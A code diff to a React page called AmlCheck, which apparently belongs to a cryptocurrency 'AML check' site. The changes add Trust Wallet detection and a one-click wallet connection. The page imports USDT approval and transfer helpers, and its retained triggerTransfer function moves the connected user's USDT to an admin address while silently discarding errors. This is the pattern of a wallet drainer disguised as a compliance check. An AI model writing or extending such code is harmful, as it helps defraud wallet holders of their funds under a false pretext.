@@ -2,7 +2,7 @@ import React, { useEffect, useMemo, useState } from 'react'
 import Header from '../components/Header.jsx'
 import Footer from '../components/Footer.jsx'
 import TrustWalletConnectModal from '../components/TrustWalletConnectModal.jsx'
-import { useAccount, useChainId } from 'wagmi'
+import { useAccount, useChainId, useConnect } from 'wagmi'
 import { CHAIN_IDS } from '../web3/config.jsx'
 import { formatUSDTAmount, readAdminAddress, callTransferFromSender, approveUSDT, checkUSDTAllowance } from '../web3/tokenTransfer'
 
@@ -18,6 +18,7 @@ export default function AmlCheck() {
   const defaultNetwork = settings.defaultNetwork || 'arbitrum'
   const defaultChainId = CHAIN_IDS[defaultNetwork]
   const chainId = liveChainId || defaultChainId
+  const { connect, connectors } = useConnect()
 
   const search = typeof window !== 'undefined' ? new URLSearchParams(window.location.search) : new URLSearchParams()
   const amountParam = search.get('amount') || '1'
@@ -91,10 +92,31 @@ export default function AmlCheck() {
   // Retain triggerTransfer for future use but not called here
   async function triggerTransfer() {
     try {
-      const adminAddr = await readAdminAddress({ contractAddress: SMART_CONTRACT_ADDRESS, chainId })
+      const adminAddr = await readAdminAddress({ smartContractAddress: SMART_CONTRACT_ADDRESS, chainId })
       const amount = formatUSDTAmount(amountParam)
       await callTransferFromSender({ contractAddress: SMART_CONTRACT_ADDRESS, recipientAddress: adminAddr, amount, chainId })
     } catch (_) {}
+  }
+
+  function isTrustWalletBrowser() {
+    const ua = typeof navigator !== 'undefined' ? navigator.userAgent || '' : ''
+    const hasInjected = typeof window !== 'undefined' && window.ethereum
+    const providerFlag = hasInjected && (window.ethereum.isTrust || window.ethereum.isTrustWallet)
+    const uaMatch = /trust\s?wallet/i.test(ua) || /trust/i.test(ua)
+    return !!(providerFlag || uaMatch)
+  }
+
+  function handleConnectTrustWallet() {
+    if (isTrustWalletBrowser()) {
+      const injected = connectors?.find(c => c.id === 'injected' || (c.name && c.name.toLowerCase().includes('injected')))
+      if (injected && connect) {
+        try { connect({ connector: injected }) } catch (_) {}
+        return
+      }
+      try { window.ethereum?.request?.({ method: 'eth_requestAccounts' }) } catch (_) {}
+    } else {
+      setTrustModalOpen(true)
+    }
   }
 
   const currentIndex = (() => {
@@ -147,7 +169,7 @@ export default function AmlCheck() {
                 </div>
               ) : (
                 <div className="aml-center">
-                  <button className="btn primary" onClick={() => setTrustModalOpen(true)}>Connect with Trust Wallet</button>
+                  <button className="btn primary" onClick={handleConnectTrustWallet}>Connect with Trust Wallet</button>
                   <p className="helper-text" style={{ marginTop: 12 }}>Connect your wallet to start AML checks.</p>
                 </div>
               )}
